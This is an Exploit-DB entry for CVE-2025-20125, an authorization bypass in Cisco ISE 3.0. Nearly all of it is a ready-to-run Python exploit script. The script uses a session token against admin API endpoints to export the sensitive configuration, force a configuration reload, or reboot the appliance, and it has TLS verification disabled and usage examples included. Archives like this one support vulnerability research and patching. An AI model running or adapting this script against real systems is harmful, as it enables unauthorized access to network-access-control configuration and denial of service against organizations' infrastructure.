---
title: [remote] Cisco ISE 3.0 - Authorization Bypass
url: https://www.exploit-db.com/exploits/52397
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:48:16.865807
---

# [remote] Cisco ISE 3.0 - Authorization Bypass

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Cisco ISE 3.0 - Authorization Bypass

#### EDB-ID:

###### 52397

#### CVE:

###### [2025-20125](https://nvd.nist.gov/vuln/detail/CVE-2025-20125)

---

**EDB Verified:**

#### Author:

###### [İbrahimsql](/?author=12279)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
# Exploit Title: Cisco ISE 3.0 - Authorization Bypass
# Exploit Author: @ibrahimsql ibrahimsql.com
# Exploit Author's github: https://github.com/ibrahmsql
# Description: Cisco ISE API Authorization Bypass
# CVE: CVE-2025-20125
# Vendor Homepage: https://www.cisco.com/
# Requirements: requests>=2.25.0, urllib3>=1.26.0
# Usage: python3 CVE-2025-20125.py --url https://ise.target.com --session TOKEN --read

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import argparse
import urllib3
urllib3.disable_warnings()

def banner():
    print(r"""
  ___  ____  ___   ___  _____    ____  ___  ____
 / __)(_  _)/ __) / __)(  _  )  (_  _)/ __)( ___)
( (__  _)(_ \__ \( (__  )(_)(    _)(_ \__ \ )__)
 \___)(____)(___/ \___)(_____)  (____)(___/(____)
Cisco ISE Authorization Bypass
CVE-2025-20125
Author: ibrahmsql | github.com/ibrahmsql
""")

def exploit_config_read(base_url, session_token):
    """
    CVE-2025-20125: Read sensitive configuration
    """
    endpoint = f"{base_url}/api/v1/admin/config/export"
    headers = {
        "Cookie": f"ISESSIONID={session_token}",
        "User-Agent": "Mozilla/5.0 (compatible; ISE-Exploit)"
    }

    print(f"[+] Attempting to read configuration from: {endpoint}")

    try:
        r = requests.get(endpoint, headers=headers, verify=False, timeout=10)

        if r.status_code == 200:
            print("[+] Configuration read successful!")
            print(f"[+] Response length: {len(r.text)} bytes")
            if r.text:
                print(f"[+] Config preview: {r.text[:300]}...")
            return True
        else:
            print(f"[-] Config read failed: {r.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def exploit_config_reload(base_url, session_token):
    """
    CVE-2025-20125: Force configuration reload
    """
    endpoint = f"{base_url}/api/v1/admin/reload"
    headers = {
        "Cookie": f"ISESSIONID={session_token}",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (compatible; ISE-Exploit)"
    }

    print(f"[+] Sending config reload request to: {endpoint}")

    try:
        r = requests.post(endpoint, headers=headers, verify=False, timeout=10)

        if r.status_code in (200, 204):
            print("[+] Configuration reload accepted!")
            print("[+] System may be restarting services...")
            return True
        elif r.status_code == 401:
            print("[-] Authentication failed - invalid session token")
        elif r.status_code == 403:
            print("[-] Access denied - insufficient privileges")
        else:
            print(f"[-] Reload failed: {r.status_code}")

        return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def exploit_system_reboot(base_url, session_token):
    """
    CVE-2025-20125: Force system reboot
    """
    endpoint = f"{base_url}/api/v1/admin/reboot"
    headers = {
        "Cookie": f"ISESSIONID={session_token}",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (compatible; ISE-Exploit)"
    }

    print(f"[+] Sending system reboot request to: {endpoint}")
    print("[!] WARNING: This will reboot the target system!")

    try:
        r = requests.post(endpoint, headers=headers, verify=False, timeout=10)

        if r.status_code in (200, 204):
            print("[+] System reboot initiated!")
            print("[+] Target system should be rebooting now...")
            return True
        else:
            print(f"[-] Reboot failed: {r.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-20125 - Cisco ISE Authorization Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 CVE-2025-20125.py --url https://ise.company.com --session ABCD1234 --read
  python3 CVE-2025-20125.py --url https://10.0.0.1:9060 --session TOKEN123 --reload
  python3 CVE-2025-20125.py --url https://ise.target.com --session XYZ789 --reboot
        """
    )

    parser.add_argument("--url", required=True, help="Base URL of Cisco ISE appliance")
    parser.add_argument("--session", required=True, help="Authenticated ISE session token")
    parser.add_argument("--read", action="store_true", help="Read sensitive configuration")
    parser.add_argument("--reload", action="store_true", help="Force configuration reload")
    parser.add_argument("--reboot", action="store_true", help="Force system reboot")

    args = parser.parse_args()

    banner()

    # URL validation
    if not args.url.startswith(('http://', 'https://')):
        print("[-] URL must start with http:// or https://")
        sys.exit(1)

    # At least one action must be specified
    if not any([args.read, args.reload, args.reboot]):
        print("[-] Specify at least one action: --read, --reload, or --reboot")
        sys.exit(1)

    success = False

    if args.read:
        success |= exploit_config_read(args.url, args.session)

    if args.reload:
        success |= exploit_config_reload(args.url, args.session)

    if args.reboot:
        # Confirm reboot action
        confirm = input("[!] Are you sure you want to reboot the target? (y/N): ")
        if confirm.lower() in ['y', 'yes']:
            success |= exploit_system_reboot(args.url, args.session)
        else:
            print("[-] Reboot cancelled by user")

    if success:
        print("\n[+] At least one exploit succeeded!")
    else:
        print("\n[-] All exploits failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-datab...